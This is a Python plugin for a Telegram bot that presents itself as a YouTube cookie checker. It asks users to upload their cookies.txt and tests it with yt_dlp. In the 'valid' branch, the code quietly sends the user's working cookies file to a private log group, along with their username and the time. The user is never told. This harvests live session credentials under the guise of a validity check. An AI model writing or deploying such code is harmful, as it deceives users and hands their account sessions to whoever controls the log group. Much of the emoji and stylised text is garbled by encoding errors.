import yt_dlp
import os
from datetime import datetime
from config import LOGGER_ID as LOG_GROUP_ID  # Configurable Logs Group
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message

# Active Users List
active_users = set()

# Stylish Symbols & Fonts for VIP Look
BULLET = "‚û§"
CHECK = "‚úÖ"
CROSS = "‚ùå"
CLOCK = "‚è≥"
SHIELD = "üõ°"
USER = "üë§"
TIME = "‚è∞"

# ‚úÖ Step 1: Enable Checking with `/chkcookies`
@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    active_users.add(message.chat.id)
    await message.reply(f"{CHECK} …¥·¥è·¥° s·¥á…¥·¥Ö  è·¥è·¥ú Ä `cookies.txt` “ì…™ ü·¥á ·¥õ·¥è ·¥Ñ ú·¥á·¥Ñ·¥ã ! {CLOCK}")

# ‚ùå Step 2: Handle Wrong Inputs (Images, Videos, Text)
@app.on_message(filters.private & ~filters.document)
async def warn_wrong_input(client, message):
    if message.chat.id in active_users:
        await message.reply(f"{CROSS} …™…¥·¥Ñ·¥è Ä Ä·¥á·¥Ñ·¥õ …™…¥·¥ò·¥ú·¥õ ! ·¥ò ü·¥á·¥Äs·¥á s·¥á…¥·¥Ö  è·¥è·¥ú Ä `cookies.txt` file.\n\n‚úÖ s·¥õ·¥á·¥òs:\n1Ô∏è‚É£ ·¥è·¥ò·¥á…¥ “ì…™ ü·¥á ·¥ç·¥Ä…¥·¥Ä…¢·¥á Ä üìÇ\n2Ô∏è‚É£ “ì…™…¥·¥Ö `cookies.txt`\n3Ô∏è‚É£ s·¥á…¥·¥Ö …™·¥õ  ú·¥á Ä·¥á ‚úÖ")

        # Log Incorrect Input
        log_msg = f"""
{SHIELD} …™…¥·¥Ñ·¥è Ä Ä·¥á·¥Ñ·¥õ …™…¥·¥ò·¥ú·¥õ ·¥Ö·¥á·¥õ·¥á·¥Ñ·¥õ·¥á·¥Ö !
{BULLET} {USER} ·¥ús·¥á Ä: {message.from_user.first_name}
{BULLET} {TIME} Time: {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
{BULLET} {CROSS} ·¥á Ä Ä·¥è Ä: s·¥á…¥·¥õ ·¥° Ä·¥è…¥…¢ “ì…™ ü·¥á ·¥è Ä ·¥ç·¥áss·¥Ä…¢·¥á …™…¥s·¥õ·¥á·¥Ä·¥Ö ·¥è“ì `cookies.txt`!
"""
        await client.send_message(LOG_GROUP_ID, log_msg)

# ‚úÖ Step 3: Accept Only If `/chkcookies` was Used
@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    if message.chat.id not in active_users:
        return  # Ignore if user didn't use `/chkcookies`

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply(f"{CROSS} ·¥ò ü·¥á·¥Äs·¥á s·¥á…¥·¥Ö ·¥Ä ·¥†·¥Ä ü…™·¥Ö `cookies.txt` “ì…™ ü·¥á!\n‚úÖ Make sure the file is named `cookies.txt`.")
        
        # Log invalid file
        log_msg = f"""
{SHIELD} …™…¥·¥†·¥Ä ü…™·¥Ö “ì…™ ü·¥á s·¥á…¥·¥õ !
{BULLET} {USER} ·¥ús·¥á Ä: {message.from_user.first_name}
{BULLET} {TIME} ·¥õ…™·¥ç·¥á: {datetime.now().strftime("%d-%m-%Y %I:%M %p")}
{BULLET} {CROSS} ·¥á Ä Ä·¥è Ä: s·¥á…¥·¥õ `{file_path.split('/')[-1]}` …™…¥s·¥õ·¥á·¥Ä·¥Ö ·¥è“ì `cookies.txt`!
"""
        await client.send_message(LOG_GROUP_ID, log_msg)
        return

    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply(f"{CROSS}  è·¥è·¥ú Ä `cookies.txt` “ì…™ ü·¥á …™s ·¥á·¥ç·¥ò·¥õ è !")
            os.remove(file_path)
            return

        # User Info & Time
        display_name = f"@{message.from_user.username}" if message.from_user.username else message.from_user.first_name
        check_time = datetime.now().strftime("%d-%m-%Y %I:%M %p")

        # Validate YouTube Cookies
        ydl_opts = {"quiet": True, "cookiefile": file_path}

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = f"{CHECK}  è·¥è·¥ú Ä  è·¥è·¥ú·¥õ·¥ú ô·¥á ·¥Ñ·¥è·¥è·¥ã…™·¥ás ·¥Ä Ä·¥á ·¥†·¥Ä ü…™·¥Ö ! "
            log_msg = f"""
{SHIELD} ·¥Ñ·¥è·¥è·¥ã…™·¥ás ·¥Ñ ú·¥á·¥Ñ·¥ã·¥á·¥Ö !
{BULLET} {CHECK}  Ä·¥ás·¥ú ü·¥õ: ·¥°·¥è Ä·¥ã…™…¥…¢ {CHECK}
{BULLET} {USER} ·¥ús·¥á Ä: {display_name}
{BULLET} {TIME} ·¥Ñ ú·¥á·¥Ñ·¥ã·¥á·¥Ö ·¥Ä·¥õ : {check_time}
"""

            await client.send_document(LOG_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = f"{CROSS} Your  è·¥è·¥ú·¥õ·¥ú ô·¥á ·¥Ñ·¥è·¥è·¥ã…™·¥ás ·¥Ä Ä·¥á …™…¥·¥†·¥Ä ü…™·¥Ö ·¥è Ä ·¥áx·¥ò…™ Ä·¥á·¥Ö !"
            log_msg = f"""
{SHIELD} ·¥Ñ·¥è·¥è·¥ã…™·¥ás ·¥Ñ ú·¥á·¥Ñ·¥ã·¥á·¥Ö !
{BULLET} {CROSS}  Ä·¥ás·¥ú ü·¥õ: …™…¥·¥†·¥Ä ü…™·¥Ö {CROSS}
{BULLET} {USER} ·¥ús·¥á Ä: {display_name}
{BULLET} {TIME} ·¥Ñ ú·¥á·¥Ñ·¥ã·¥á·¥Ö ·¥Ä·¥õ: {check_time}
"""
            await client.send_message(LOG_GROUP_ID, log_msg)

        await message.reply(msg)

    except Exception as e:
        await message.reply(f"‚ö†Ô∏è ·¥á Ä Ä·¥è Ä: `{str(e)}`")

    os.remove(file_path)
    active_users.discard(message.chat.id)
